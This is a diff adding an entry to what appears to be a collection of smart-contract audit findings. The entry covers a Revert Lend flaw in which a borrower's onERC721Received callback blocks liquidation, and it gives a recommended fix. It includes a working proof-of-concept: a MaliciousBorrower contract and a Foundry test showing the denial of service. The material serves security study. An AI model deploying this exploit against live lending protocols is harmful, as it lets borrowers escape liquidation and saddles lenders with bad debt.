@@ -534,3 +534,83 @@ index 6c5a1d7..196e3a0 100644
 ```
 
 </details>
+
+## 9.[High] Owner of a position can prevent liquidation due to the onERC721Received callback
+
+### `onERC721Received()` prevents liquidation
+
+- Summary: When liquidating a position, the `_cleanUpLoan()` function is called to transfer the Uniswap LP position back to the user. However, this process relies on the `safeTransferFrom()` function, which invokes the `onERC721Received()` function on the owner's contract. If the owner's contract returns an invalid value, it can cause the `safeTransferFrom()` to revert, preventing liquidation.
+
+- Impact & Recommendation: A solution to ensure liquidation occurs is to use a "pull over push" approach, where NFT approval is given to the owner, allowing them to redeem the NFT later.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-revert-lend#h-06-owner-of-a-position-can-prevent-liquidation-due-to-the-onerc721received-callback) & [Report](https://code4rena.com/reports/2024-03-revert-lend)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+    contract MaliciousBorrower {
+
+        address public vault;
+        constructor(address _vault) {
+            vault = _vault;
+        }
+        function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
+            // Does not accept ERC721 tokens from the vault. This causes liquidation to revert
+            if (from == vault) return bytes4(0xdeadbeef);
+            else return msg.sig;
+        }
+    }
+
+  ```
+
+  ```solidity
+  function test_preventLiquidation() external {
+
+        // Create malicious borrower, and setup a loan
+        address maliciousBorrower = address(new MaliciousBorrower(address(vault)));
+        custom_setupBasicLoan(true, maliciousBorrower);
+        // assert: debt is equal to collateral value, so position is not liquidatable
+        (uint256 debt,,uint256 collateralValue, uint256 liquidationCost, uint256 liquidationValue) = vault.loanInfo(TEST_NFT);
+        assertEq(debt, collateralValue);
+        // collateral DAI value change -100%
+        vm.mockCall(
+            CHAINLINK_DAI_USD,
+            abi.encodeWithSelector(AggregatorV3Interface.latestRoundData.selector),
+            abi.encode(uint80(0), int256(0), block.timestamp, block.timestamp, uint80(0))
+        );
+
+        // ignore difference
+        oracle.setMaxPoolPriceDifference(10001);
+        // assert that debt is greater than collateral value (position is liquidatable now)
+        (debt, , collateralValue, liquidationCost, liquidationValue) = vault.loanInfo(TEST_NFT);
+        assertGt(debt, collateralValue);
+        (uint256 debtShares) = vault.loans(TEST_NFT);
+        vm.startPrank(WHALE_ACCOUNT);
+        USDC.approve(address(vault), liquidationCost);
+        // This fails due to malicious owner. So under-collateralised position can't be liquidated. DoS!
+        vm.expectRevert("ERC721: transfer to non ERC721Receiver implementer");
+        vault.liquidate(IVault.LiquidateParams(TEST_NFT, debtShares, 0, 0, WHALE_ACCOUNT, ""));
+    }
+    function custom_setupBasicLoan(bool borrowMax, address borrower) internal {
+        // lend 10 USDC
+        _deposit(10000000, WHALE_ACCOUNT);
+        // Send the test NFT to borrower account
+        vm.prank(TEST_NFT_ACCOUNT);
+        NPM.transferFrom(TEST_NFT_ACCOUNT, borrower, TEST_NFT);
+        uint256 tokenId = TEST_NFT;
+        // borrower adds collateral
+        vm.startPrank(borrower);
+        NPM.approve(address(vault), tokenId);
+        vault.create(tokenId, borrower);
+        (,, uint256 collateralValue,,) = vault.loanInfo(tokenId);
+        // borrower borrows assets, backed by their univ3 position
+        if (borrowMax) {
+            // borrow max
+            vault.borrow(tokenId, collateralValue);
+        }
+        vm.stopPrank();
+    }
+
+
+  ```
+
+  </details>
